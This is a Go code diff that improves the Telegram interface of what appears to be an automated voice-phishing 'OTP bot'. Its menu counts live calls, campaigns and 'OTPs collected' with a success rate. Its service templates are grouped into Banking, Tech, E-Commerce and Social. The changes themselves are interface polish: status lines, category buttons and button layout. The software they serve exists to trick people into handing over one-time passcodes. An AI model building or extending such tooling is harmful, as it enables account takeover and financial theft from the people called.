@@ -170,6 +170,9 @@ func (b *Bot) answerCallback(callbackID string, text string, showAlert bool) {
 func (b *Bot) handleCallbackQuery(callback *tgbotapi.CallbackQuery) {
 	userID := callback.From.ID
 
+	// Show typing indicator for smoother UX
+	b.sendTypingAction(callback.Message.Chat.ID)
+
 	cb, err := ParseCallbackData(callback.Data)
 	if err != nil {
 		b.answerCallback(callback.ID, "⚠️ Invalid action", true)
@@ -333,20 +336,34 @@ func (b *Bot) showMainMenu(chatID int64, messageID int) {
 		activeIndicator = "🔥"
 	}
 	
+	// Build status bar based on system state
+	statusLine := "⚡ System Ready"
+	if stats.ActiveCampaigns > 0 {
+		statusLine = fmt.Sprintf("🚀 %d Campaign(s) Active", stats.ActiveCampaigns)
+	}
+	if activeCalls > 0 {
+		statusLine = fmt.Sprintf("📞 %d Live Calls", activeCalls)
+	}
+	
 	text := fmt.Sprintf(`🍕━━━━━━━━━━━━━━━━━━━━━━━🍕
 
-🔮 *WELCOME, OPERATOR* 🔮
+👋 *WELCOME BACK, OPERATOR*
 
 ━━━━━━━━━━━━━━━━━━━━━━━
-%[1]s *Active Calls:* %[2]d
-📋 *Campaigns:* %[3]d total | %[4]d active
-🔐 *Captures:* %[5]d OTPs collected
-📈 *Success Rate:* %[6]s %.1f%%
+
+%[1]s
+
+%[2]s *Active Calls:* %[3]d
+📋 *Campaigns:* %[4]d total | %[5]d active
+🔐 *Captures:* %[6]d OTPs collected
+📈 *Success Rate:* %[7]s %.1f%%
+
 ━━━━━━━━━━━━━━━━━━━━━━━
 
 🎯 *SELECT AN ACTION*
 
 `, 
+		statusLine,
 		activeIndicator, activeCalls, 
 		stats.TotalCampaigns, stats.ActiveCampaigns, 
 		stats.TotalCaptures, successColor, stats.SuccessRate)
@@ -722,25 +739,73 @@ func (b *Bot) showTemplates(chatID int64, messageID int) {
 		return
 	}
 
+	// Group templates by category
+	categoryMap := make(map[string][]models.Template)
+	for _, t := range templates {
+		cat := t.Category
+		if cat == "" {
+			cat = "other"
+		}
+		categoryMap[cat] = append(categoryMap[cat], t)
+	}
+
 	var text string
 	if len(templates) == 0 {
-		text = "📝 *Templates*\n\nNo templates yet."
+		text = "📝 *Templates*\n\nNo templates yet.\n\n💡 Use /addtemplate to create one!"
 	} else {
-		text = "📝 *Service Templates*\n\n"
-		for _, t := range templates {
-			text += fmt.Sprintf("• *%s* - `%s`\n", t.Name, t.Voice)
+		text = "📝 *Service Templates*\n\n━━━━━━━━━━━━━━━━━━━━\n"
+		for category, tpls := range categoryMap {
+			icon := CategoryIcons[category]
+			if icon == "" {
+				icon = "📌"
+			}
+			catName := strings.Title(category)
+			text += fmt.Sprintf("%s *%s*\n", icon, catName)
+			for _, t := range tpls {
+				templateIcon := t.Icon
+				if templateIcon == "" {
+					templateIcon = "📱"
+				}
+				text += fmt.Sprintf("  %s %s\n", templateIcon, t.Name)
+			}
+			text += "\n"
 		}
+		text += "━━━━━━━━━━━━━━━━━━━━"
 	}
 
 	var keyboard tgbotapi.InlineKeyboardMarkup
+	
+	// Add category filter buttons
+	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
+		{
+			tgbotapi.NewInlineKeyboardButtonData("🏦 Banking", MarshalCallbackData(ActionTemplatesBanking, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("💻 Tech", MarshalCallbackData(ActionTemplatesTech, nil)),
+		},
+		{
+			tgbotapi.NewInlineKeyboardButtonData("🛒 E-Commerce", MarshalCallbackData(ActionTemplatesEcomm, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("📱 Social", MarshalCallbackData(ActionTemplatesSocial, nil)),
+		},
+		{
+			tgbotapi.NewInlineKeyboardButtonData("📌 Other", MarshalCallbackData(ActionTemplatesOther, nil)),
+		},
+	}
+
+	// Add template buttons in rows of 2
+	var templateButtons []tgbotapi.InlineKeyboardButton
 	for _, t := range templates {
 		data := map[string]string{"name": t.Name}
-		keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
-			[]tgbotapi.InlineKeyboardButton{
-				tgbotapi.NewInlineKeyboardButtonData(fmt.Sprintf("📱 %s", t.Name), MarshalCallbackData(ActionTemplateDetails, data)),
-			},
-		)
+		templateButtons = append(templateButtons, tgbotapi.NewInlineKeyboardButtonData(fmt.Sprintf("📱 %s", t.Name), MarshalCallbackData(ActionTemplateDetails, data)))
 	}
+	
+	// Group template buttons into rows of 2
+	for i := 0; i < len(templateButtons); i += 2 {
+		row := []tgbotapi.InlineKeyboardButton{templateButtons[i]}
+		if i+1 < len(templateButtons) {
+			row = append(row, templateButtons[i+1])
+		}
+		keyboard.InlineKeyboard = append(keyboard.InlineKeyboard, row)
+	}
+
 	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
 		[]tgbotapi.InlineKeyboardButton{
 			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
